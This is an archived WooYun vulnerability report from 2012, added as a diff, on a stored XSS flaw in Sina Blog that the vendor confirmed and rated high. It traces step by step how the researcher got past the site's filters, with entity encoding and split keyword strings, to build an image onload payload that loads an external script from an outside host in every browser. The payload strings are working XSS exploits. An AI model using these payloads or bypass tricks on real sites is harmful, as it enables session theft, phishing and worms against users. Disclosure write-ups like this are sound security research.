@@ -1,0 +1,457 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		新浪博客储存型XSS漏洞（访问就中招），可以加载任意外部js文件  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		新浪博客储存型XSS漏洞（访问就中招），可以加载任意外部js文件  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/px1624">px1624</a> 
+</li><li>提交时间：		2012-06-06 09:36</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2012-06-06：	细节已通知厂商并且等待厂商处理中<br/>
+									2012-06-06：	厂商已经确认，细节仅向厂商公开<br/>
+									2012-06-16：	细节向核心白帽子及相关领域专家公开<br/>
+									2012-06-26：	细节向普通白帽子公开<br/>
+									2012-07-06：	细节向实习白帽子公开<br/>
+									2012-07-21：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">首先，看到好多人都有礼物收，还有的有收到SAE云豆的奖励。俺是看在眼里，嫉妒在心里啊！俺也想要，嘎嘎。<br />
+<br />
+但是据说只有大公司才给送，就去SAE去找漏洞了，好不容易找到了一个储存型的XSS，<br />
+<br />
+结果隔了一天竟然被修复了，想了下应该我找到的和前几天乌云上别人提交的那个SAE的XSS是同一个吧。<br />
+<br />
+于是今天就转战去新浪折腾去了。<br />
+<br />
+终于在新浪博客找到了一个储存型的XSS，并且成功的绕过限制后，可以插入任意外部js文件。<br />
+<br />
+钓鱼啦，蠕虫啦，什么的都可以直接搞了。<br />
+<br />
+<br />
+最后，求礼物或者SAE云豆啊！有木有。</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">下面来和大家分析分享一下我寻找这个漏洞并且利用的的整个过程。<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+1. 看到好多乌云的储存型XSS帖子都是从图片，视频之类的搞起的，于是我就去新浪博客首页去发了个图试<br />
+<br />
+<br />
+<br />
+了试。<br />
+<br />
+<br />
+<br />
+抓包的原post代码<br />
+<br />
+<br />
+<br />
+&lt;A id=up_img_58081338895761039 href=&quot;http://album.sina.com.cn/pic/6f81831bhc1b7f66073a7&amp;amp;690&quot; target=_blank&gt;&lt;IMG src=&quot;http://s8.sinaimg.cn/bmiddle/6f81831bhc1b7f66073a7&quot;&gt;&lt;/A&gt;&lt;BR&gt;&lt;BR&gt;966<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+2. 于是我像测试其他网站XSS漏洞一样给IMG标签中的src地址后面加了个&#039;&quot;&gt;&lt;/\，用来测试地址有没有过滤<br />
+<br />
+<br />
+<br />
+特殊字符，像这样src=&quot;xxxx&#039;&quot;&gt;&lt;/\&quot;<br />
+<br />
+<br />
+<br />
+结果不出所料，果然是给过滤掉了 &quot; 。<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+3. 之后我又想既然过滤掉了&quot;那么&amp;quot;有没有过滤呢？<br />
+<br />
+<br />
+<br />
+于是将post地址修改成如下形式<br />
+<br />
+<br />
+<br />
+src=&quot;xxxx&amp;quot;onload=&amp;quot;alert(1)&amp;quot;&quot;<br />
+<br />
+<br />
+<br />
+提交之后刷新后弹出了1，说明执行了alert(1)，当时蛮高兴的，因为说明这里是存在储存型的XSS的，没有<br />
+<br />
+<br />
+<br />
+过滤onload和&amp;quot;。<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+4. 然后的想法肯定是和大家一样了，插入外部js文件。<br />
+<br />
+<br />
+<br />
+查看了首页的源文件后，发现script标签的第3个是src形式的，于是我在post数据中写了如下代码。<br />
+<br />
+<br />
+<br />
+src=&quot;xxxx&amp;quot;onload=&amp;quot;document.getElementsByTagName(&#039;script&#039;)[2].src=&#039;http://px1624.sinaapp.com/pxrenren.js&#039;&amp;quot;&quot;<br />
+<br />
+<br />
+<br />
+结果竟然没有调用成功，图片不显示了。用F12看源码，也看不到任何和我post有关的数据。<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+5. 想了下，应该是新浪过滤了单引号吧，于是便把单引号全部替换为了&amp;#39;<br />
+<br />
+<br />
+<br />
+发现竟然还是不成功，一段时间的测试之后发现[]也被过滤了，于是我便把[]也替换成了&amp;#x5B;和&amp;#x5D;<br />
+<br />
+<br />
+<br />
+便成了如下的post数据<br />
+<br />
+<br />
+<br />
+src=&quot;xxxx&amp;quot;onload=&amp;quot;document.getElementsByTagName(&amp;#39;script&amp;#39;)&amp;#x5B;2&amp;#x5D;.src=&amp;#39;http://px1624.sinaapp.com/pxrenren.js&amp;#39;&amp;quot;&quot;<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+6. 但是还是不成功。不愧是新浪啊，限制因素真多，就算找到了xss点想插入外部js文件还是困难重重。<br />
+<br />
+<br />
+<br />
+接着我想到，会不会是document或者getElementsByTagName等关键字被过滤了？<br />
+<br />
+<br />
+<br />
+于是我试着alert(document.cookie)了一下,发现可以弹出，那就应该是过滤了getElementsByTagName了。<br />
+<br />
+<br />
+<br />
+但是这里我们需要用getElementsByTagName来修改script中的src，怎么办呢？<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+7. 我试着用String.fromCharCode()把getElementsByTagName转换成ASCII码来绕过，结果还是不行。<br />
+<br />
+<br />
+<br />
+最后我想到用字符串拆分的办法，把getElementsByTagName拆开写去绕过限制，如下方法<br />
+<br />
+<br />
+<br />
+document.getElementsByTagName ------&gt; document[&#039;get&#039;+&#039;ElementsByTagName&#039;]<br />
+<br />
+<br />
+<br />
+post数据如下<br />
+<br />
+<br />
+<br />
+src=&quot;xxxx&amp;quot;onload=&amp;quot;document&amp;#x5B;&amp;#39;get&amp;#39;+&amp;#39;ElementsByTagName&amp;#39;&amp;#x5D;(&amp;#39;script&amp;#39;)&amp;#x5B;2&amp;#x5D;.src=&amp;#39;http://px1624.sinaapp.com/pxrenren.js&amp;#39;&amp;quot;&quot;<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+结果如图<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/06005259c4e2257c2e3aaf1374c476dcaffc5507.jpg" target="_blank"><img src="../images/06005259c4e2257c2e3aaf1374c476dcaffc5507.jpg" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+终于成功调用了外部js了。<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+8. 但是还没完，因为document.getElementsByTagName是IE-only的，如果用非IE浏览器的话，是不会中招的。<br />
+<br />
+<br />
+<br />
+于是我需要写一个浏览器通杀的代码。<br />
+<br />
+<br />
+<br />
+下面转向谷歌浏览器测试。<br />
+<br />
+<br />
+<br />
+我想到了<br />
+<br />
+<br />
+<br />
+var s=document.createElement(&quot;script&quot;);<br />
+<br />
+s.src=&quot;JS地址&quot;;<br />
+<br />
+document.body.appendChild(s);<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+9. 果然，新浪也过滤了createElement，appendChild等关键词，<br />
+<br />
+<br />
+<br />
+绕过方法同上，把字符串拆开写。<br />
+<br />
+<br />
+<br />
+代码如下<br />
+<br />
+<br />
+<br />
+&amp;quot;onload=&amp;quot;var&amp;#32;s=document&amp;#x5B;&amp;#39;creat&amp;#39;+&amp;#39;eElement&amp;#39;&amp;#x5D;(&amp;#39;script&amp;#39;);s.src=&amp;#39;http://px1624.sinaapp.com/pxrenren.js&amp;#39;;document.body&amp;#x5B;&amp;#39;appe&amp;#39;+&amp;#39;ndChild&amp;#39;&amp;#x5D;(s)&amp;quot;<br />
+<br />
+<br />
+<br />
+结果发现<br />
+<br />
+<br />
+<br />
+var&amp;#32;s= 提交后这里的空格&amp;#32;自动变成了20%了。<br />
+<br />
+<br />
+<br />
+于是想到了和空格差不多的tab，<br />
+<br />
+<br />
+<br />
+var&amp;#09;s= 结果提交后这里的&amp;#09;也自动变成了%09;<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+10. 我擦，看来只有出绝招了，利用window的属性去通杀吧！<br />
+<br />
+<br />
+<br />
+把上面代码中的var s和s都替换成window.s，post的代码变为了<br />
+<br />
+<br />
+<br />
+&amp;quot;onload=&amp;quot;window.s=document&amp;#x5B;&amp;#39;creat&amp;#39;+&amp;#39;eElement&amp;#39;&amp;#x5D;(&amp;#39;script&amp;#39;);window.s.src=&amp;#39;http://px1624.sinaapp.com/pxrenren.js&amp;#39;;document.body&amp;#x5B;&amp;#39;appe&amp;#39;+&amp;#39;ndChild&amp;#39;&amp;#x5D;(window.s)&amp;quot;<br />
+<br />
+<br />
+<br />
+测试，终于ok了，所有浏览器通杀！<br />
+<br />
+<br />
+<br />
+火狐和谷歌的效果如图<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/060105300186a72bd304bc65bf716f69652a12bc.jpg" target="_blank"><img src="../images/060105300186a72bd304bc65bf716f69652a12bc.jpg" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/06010544d2dad61123ed816cc3e43dcc2993fb23.jpg" target="_blank"><img src="../images/06010544d2dad61123ed816cc3e43dcc2993fb23.jpg" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+<br />
+<br />
+下面图是charles和网页F12中的代码截图。<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/06004932466b2ab5e0050450137c008f72c9280a.jpg" target="_blank"><img src="../images/06004932466b2ab5e0050450137c008f72c9280a.jpg" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+上图中圈起来的部分，是post数据中自己插入的构造代码。<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/06005036c38bd1e9866c63323594f65ffe997a63.jpg" target="_blank"><img src="../images/06005036c38bd1e9866c63323594f65ffe997a63.jpg" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+上图中显示成功的调用了我的外部js文件。<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+上次试人人网的时候直接<br />
+<br />
+<br />
+<br />
+onlaod=&quot;document.getElementsByTagName(&#039;script&#039;)[2].src=&#039;http://px1624.sinaapp.com/pxrenren.js&#039;&quot; <br />
+<br />
+就ok了，没想到新浪这里过滤和限制了这么多，果然安全性不是一个级别的哦。<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+忙活了蛮久的，终于还是成功了可以调用外部任意js了。<br />
+<br />
+<br />
+<br />
+最后这里要感谢gainover在我突破限制的过程中对我的一些提示与帮助，谢谢大家的细心阅读，分析描述完毕！<br />
+<br />
+ </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">见详细说明过程。 </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">你懂的。 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/px1624" title="px1624">px1624</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-07921" title="新浪博客储存型XSS漏洞（访问就中招），可以加载任意外部js文件">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：高</p>
+						<p class="detail">漏洞Rank：15 </p>
+													<p class="detail">确认时间：2012-06-06 11:03</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">感谢提供，马上处理。</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="7921";
+var bugRating="2";
+var myRating="";
+var ratingCount="6";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
